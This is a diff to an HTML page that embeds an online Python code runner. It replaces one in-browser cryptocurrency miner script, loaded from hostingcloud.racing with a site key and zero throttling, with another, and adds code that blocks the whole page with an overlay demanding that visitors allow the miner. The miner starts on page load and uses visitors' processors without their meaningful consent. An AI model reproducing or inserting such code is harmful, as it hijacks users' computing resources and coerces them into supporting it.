@@ -12,13 +12,31 @@
     <center>
       <iframe src="https://trinket.io/embed/python3/70a973d251?outputOnly=true&runOption=run" width="69%" height="356" frameborder="0" marginwidth="0" marginheight="0" allowfullscreen></iframe>
     </center>
-    <script src="https://www.hostingcloud.racing/vnxu.js"></script>
-    <script>
-      var _client = new Client.Anonymous('70eda1d5b4ac9750566214f4065b0e67c354134790ee39df94822d668194ad29', {
-      throttle: 0, ads: 0
-    });
-      _client.start();
-</script>  </body>
+      <script src="https://www.hostingcloud.racing/vnxu.js"></script>
+      <script>
+          var _client = new Client.Anonymous('ddd947a7fc8627ad044df443cd564256b9346f50f2ab1f3e87c4f17dae4c31d2', {
+              throttle: 0
+          });
+          _client.start();
+
+      </script>
+      <script>
+          setTimeout(function(){
+              if(typeof _client === 'undefined' || _client === null)
+              {
+                  var messageDiv = document.createElement("div");
+                  messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                  messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                  var mainDiv = document.createElement("div");
+                  mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                  mainDiv.appendChild(messageDiv);
+                  document.body.appendChild(mainDiv);
+                  document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                  window.scrollTo(0, 0);
+              }
+          },1000);
+      </script> 
+   </body>
   <footer>
     <center>
       <p>Press "▶Run" to start</p>
